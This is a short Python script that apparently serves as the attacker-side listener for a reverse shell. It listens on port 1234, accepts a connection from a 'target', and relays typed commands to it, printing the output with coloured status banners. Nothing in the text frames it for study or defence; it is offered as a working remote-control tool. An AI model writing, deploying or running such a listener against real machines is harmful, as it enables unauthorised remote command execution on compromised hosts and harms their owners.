#!/usr/bin/python3

import socket
from termcolor import colored
import time

def shell():
	
	while True:
		cmd = input(f"{ip}~> ")
		trgt.send(cmd.encode('utf-8'))

		if cmd == 'exit':
			print(colored("\n[-] Closing connection...", 'yellow'))
			time.sleep(2)
			print(colored("[-] Connection Closed\n", 'red'))
			break
		else:
			result = trgt.recv(10024)
			print(result.decode('utf-8'))


def server():

	global ip
	global trgt
	global sock

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	'''
	parser = argparse.ArgumentParser()

	parser.add_argument("ip", help="specify Target ip")
	parser.add_argument("port", help="specify Target port")

	args = parser.parse_args()

	ip = args.ip
	port = args.port
	'''
	ip = "0.0.0.0"
	port = 1234

	sock.bind((ip, port))
	sock.listen(5)

	print(colored('''
[+] Listening For Incoming Connections''', 'green'))


	trgt, ip = sock.accept()
	print(colored(f"[+] Connections Established From: {ip}", 'green'))

def func():
	server()
	shell()
	sock.close()


if __name__ == '__main__': 

	func()

